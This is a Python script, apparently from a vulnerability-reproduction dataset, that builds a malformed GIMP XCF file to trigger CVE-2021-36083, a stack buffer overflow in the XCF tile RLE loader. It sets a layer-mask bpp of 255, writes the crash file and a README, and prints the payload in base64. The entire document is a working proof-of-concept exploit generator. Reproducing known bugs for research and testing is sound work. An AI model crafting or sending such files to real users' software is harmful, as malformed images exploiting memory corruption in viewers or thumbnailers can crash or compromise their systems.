#!/usr/bin/env python3
"""Craft a minimal XCF that triggers CVE-2021-36083 (bpp > 4 stack overflow)."""

from __future__ import annotations

import base64
import struct
from pathlib import Path


def be(*vals: int) -> bytes:
    return b"".join(struct.pack(">I", v & 0xFFFFFFFF) for v in vals)


def prop(ptype: int, data: bytes = b"") -> bytes:
    return be(ptype, len(data)) + data


def qstring(s: str) -> bytes:
    raw = s.encode("ascii") + b"\x00"
    return be(len(raw)) + raw


def rle_solid(count: int, value: int = 0) -> bytes:
    # val=127 -> length becomes 128 -> read 16-bit BE length, then one fill byte
    if not 1 <= count <= 65535:
        raise ValueError(count)
    return bytes([127, (count >> 8) & 0xFF, count & 0xFF, value & 0xFF])


def build_level(width: int, height: int, bpp: int, tile_w: int, tile_h: int) -> tuple[bytes, int, int]:
    image_size = tile_w * tile_h
    rle = b"".join(rle_solid(image_size, 0) for _ in range(bpp))
    body = bytearray()
    body += be(width, height)
    body += be(0, 0)  # tile_off, end_off placeholders
    rle_at = len(body)
    body += rle
    return bytes(body), rle_at, len(rle)


def patch_u32(buf: bytearray, pos: int, value: int) -> None:
    buf[pos : pos + 4] = struct.pack(">I", value & 0xFFFFFFFF)


def craft() -> bytes:
    out = bytearray()
    out += b"gimp xcf file\x00"
    out += be(64, 64, 0)  # RGB image

    out += prop(17, bytes([1]))  # PROP_COMPRESSION = RLE
    out += prop(0, b"")  # PROP_END

    layer_list_pos = len(out)
    out += be(0, 0)  # layer offset + terminator
    out += be(0)  # channel list terminator

    # Main layer: RGBA with valid bpp=4 hierarchy, plus mask with bpp=255.
    layer_off = len(out)
    out += be(64, 64, 1)  # RGBA_GIMAGE
    out += qstring("L")
    out += prop(8, be(1))  # PROP_VISIBLE
    out += prop(6, be(255))  # PROP_OPACITY
    out += prop(7, be(0))  # PROP_MODE
    out += prop(0, b"")

    hier_ptr_pos = len(out)
    out += be(0)
    mask_ptr_pos = len(out)
    out += be(0)

    main_hier_off = len(out)
    out += be(64, 64, 4)
    main_level_ptr_pos = len(out)
    out += be(0)
    out += be(0)

    main_level_off = len(out)
    level_raw, rle_rel, rle_len = build_level(64, 64, 4, 64, 64)
    level_buf = bytearray(level_raw)
    tile_data_abs = main_level_off + rle_rel
    patch_u32(level_buf, 8, tile_data_abs)
    patch_u32(level_buf, 12, tile_data_abs + rle_len)
    out += level_buf

    mask_off = len(out)
    out += be(64, 64)
    out += qstring("M")
    out += prop(0, b"")
    mask_hier_ptr_pos = len(out)
    out += be(0)

    mask_hier_off = len(out)
    out += be(64, 64, 255)  # bpp=255 -> overflow 251 bytes, reaches ASan redzone (not just assignBytes)
    mask_level_ptr_pos = len(out)
    out += be(0)
    out += be(0)

    mask_level_off = len(out)
    mlevel_raw, mrle_rel, mrle_len = build_level(64, 64, 255, 64, 64)
    mlevel_buf = bytearray(mlevel_raw)
    mtile_abs = mask_level_off + mrle_rel
    patch_u32(mlevel_buf, 8, mtile_abs)
    patch_u32(mlevel_buf, 12, mtile_abs + mrle_len)
    out += mlevel_buf

    patch_u32(out, layer_list_pos, layer_off)
    patch_u32(out, hier_ptr_pos, main_hier_off)
    patch_u32(out, mask_ptr_pos, mask_off)
    patch_u32(out, main_level_ptr_pos, main_level_off)
    patch_u32(out, mask_hier_ptr_pos, mask_hier_off)
    patch_u32(out, mask_level_ptr_pos, mask_level_off)
    return bytes(out)


def main() -> None:
    payload = craft()
    poc_dir = Path("Dataset/CVE-2021-36083/vuln_data/vuln_pocs")
    poc_dir.mkdir(parents=True, exist_ok=True)
    path = poc_dir / "crafted_bpp5.xcf"
    path.write_bytes(payload)
    b64 = base64.b64encode(payload).decode("ascii")
    (poc_dir / "README.md").write_text(
        "crafted_bpp5.xcf: minimal XCF with layer-mask hierarchy bpp=255 to trigger "
        "CVE-2021-36083 (stack-buffer-overflow WRITE in XCFImageFormat::loadTileRLE).\n"
        "Based on fix 297ed9a2 (reject bpp > 4) / oss-fuzz 33742.\n",
        encoding="utf-8",
    )
    print(f"wrote {path} size={len(payload)}")
    print(f"header={payload[:14]!r}")
    print(f"b64_len={len(b64)}")
    print(b64)


if __name__ == "__main__":
    main()
